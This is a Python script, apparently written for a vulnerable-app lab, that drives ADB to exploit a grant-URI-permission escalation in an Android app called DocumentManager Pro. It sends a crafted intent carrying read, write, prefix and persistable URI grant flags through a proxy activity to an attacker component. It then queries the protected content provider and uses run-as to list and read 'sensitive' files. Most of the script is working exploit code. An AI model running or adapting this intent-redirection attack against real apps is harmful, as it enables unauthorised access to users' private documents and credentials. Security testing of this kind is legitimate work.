#!/usr/bin/env python3
"""
Test script to demonstrate the Grant URI Permission Escalation vulnerability
in DocumentManager Pro (ben75).

This script uses ADB to launch an exploit that bypasses the non-exported
content provider restriction using URI permission grant flags.
"""

import subprocess
import sys
import json

def run_adb_command(cmd):
    """Run an ADB command and return the output."""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except Exception as e:
        return "", str(e), 1

def test_direct_content_provider_access():
    """Test direct access to the content provider (should fail)."""
    print("🔒 Testing direct access to content provider...")
    
    # Test accessing different content provider endpoints
    providers = [
        "content://com.documentmanager.secure/documents",
        "content://com.documentmanager.secure/users", 
        "content://com.documentmanager.secure/sessions"
    ]
    
    all_blocked = True
    for provider_uri in providers:
        cmd = f'adb shell content query --uri {provider_uri}'
        stdout, stderr, code = run_adb_command(cmd)
        
        if "SecurityException" in stderr or "Permission Denial" in stderr or code != 0:
            print(f"✅ {provider_uri} correctly blocked")
        else:
            print(f"❌ Unexpected: {provider_uri} accessible")
            print(f"   Response: {stdout}")
            all_blocked = False
    
    return all_blocked

def exploit_uri_permission_escalation():
    """Exploit the vulnerability using URI permission grant escalation."""
    print("\n🎯 Launching URI Permission Escalation exploit...")
    
    # Create malicious workflow intent with URI permission flags
    exploit_payload = {
        "action": "android.intent.action.VIEW",
        "data": "content://com.documentmanager.secure/documents",
        "flags": [
            "FLAG_GRANT_READ_URI_PERMISSION",
            "FLAG_GRANT_WRITE_URI_PERMISSION", 
            "FLAG_GRANT_PREFIX_URI_PERMISSION",
            "FLAG_GRANT_PERSISTABLE_URI_PERMISSION"
        ],
        "component": "com.attacker.malicious/.DataReceiver"  # Attacker's component
    }
    
    # Launch the exploit via IntentProcessorActivity
    cmd = f'''adb shell am start \\
        -n com.documentmanager/.IntentProcessorActivity \\
        --es workflow_intent '{json.dumps(exploit_payload)}'
    '''
    
    print("📋 Exploit payload:")
    print(json.dumps(exploit_payload, indent=2))
    print(f"\n🚀 Executing: {cmd}")
    
    stdout, stderr, code = run_adb_command(cmd)
    
    if code == 0:
        print("✅ Exploit intent sent successfully")
        print(f"Response: {stdout}")
        return True
    else:
        print(f"❌ Exploit failed: {stderr}")
        return False

def test_permission_granted():
    """Test if URI permissions were actually granted."""
    print("\n🔍 Testing if URI permissions were granted...")
    
    # After the exploit, try to access the content provider again
    cmd = 'adb shell content query --uri content://com.documentmanager.secure/documents'
    stdout, stderr, code = run_adb_command(cmd)
    
    if code == 0 and "Row:" in stdout:
        print("🚨 SUCCESS: Content provider now accessible!")
        print("Sensitive data exposed:")
        print(stdout)
        return True
    else:
        print("ℹ️  Content provider still blocked (expected in this test)")
        print("Note: Full exploitation requires a malicious receiver app")
        return False

def demonstrate_sensitive_data():
    """Show what sensitive data the vulnerability could expose."""
    print("\n📊 Demonstrating sensitive data that could be exposed...")
    
    # Show what's available via run-as (simulating successful attack)
    cmd = 'adb shell "run-as com.documentmanager ls -la /data/data/com.documentmanager/files/secure/"'
    stdout, stderr, code = run_adb_command(cmd)
    
    if code == 0:
        print("💰 Sensitive files that could be stolen:")
        print(stdout)
        
        # Show contents of one sensitive file
        cmd2 = 'adb shell "run-as com.documentmanager head -10 /data/data/com.documentmanager/files/secure/Financial_Report_Q4_2024.pdf"'
        stdout2, stderr2, code2 = run_adb_command(cmd2)
        
        if code2 == 0:
            print("\n🔥 Sample sensitive content:")
            print(stdout2)
        
        return True
    else:
        print("⚠️  Could not access sensitive files in this test environment")
        return False

def check_app_installed():
    """Check if DocumentManager Pro is installed."""
    print("📱 Checking if DocumentManager Pro is installed...")
    cmd = 'adb shell pm list packages | grep com.documentmanager'
    stdout, stderr, code = run_adb_command(cmd)
    
    if "com.documentmanager" in stdout:
        print("✅ DocumentManager Pro is installed")
        return True
    else:
        print("❌ DocumentManager Pro not found. Please install the APK first.")
        return False

def main():
    print("🔥 Grant URI Permission Escalation Vulnerability Test")
    print("=" * 60)
    
    # Check if app is installed
    if not check_app_installed():
        return
    
    # Launch app to initialize content provider
    print("\n📱 Initializing DocumentManager Pro...")
    init_cmd = "adb shell am start -n com.documentmanager/.MainActivity"
    run_adb_command(init_cmd)
    
    # Test direct access (should fail)
    if test_direct_content_provider_access():
        print("\n✅ Content provider properly secured by export restrictions")
    else:
        print("\n⚠️  Warning: Content provider may already be accessible")
    
    # Try the URI permission escalation exploit
    if exploit_uri_permission_escalation():
        print("\n🎉 URI Permission Escalation exploit launched!")
        
        # Test if permissions were granted
        test_permission_granted()
        
        # Show what sensitive data could be stolen
        demonstrate_sensitive_data()
        
        print("\n📊 Attack Impact Analysis:")
        print("• Financial data: Revenue, profit, bank accounts")  
        print("• Employee records: SSNs, salaries, security clearances")
        print("• Client contracts: Banking details, contact information")
        print("• Authentication data: Password hashes, session tokens")
        
        print("\n🔍 Monitor attack in logs:")
        print("adb logcat | grep -E 'DocumentProcessor|DocumentProvider'")
    else:
        print("\n❌ Exploit attempt failed")
    
    print("\n📋 Vulnerability Summary:")
    print("This attack bypasses non-exported content provider restrictions")
    print("by using a proxy activity that processes embedded intents with")
    print("URI permission grant flags, enabling persistent access to")
    print("sensitive business data that should be completely protected.")

if __name__ == "__main__":
    main()
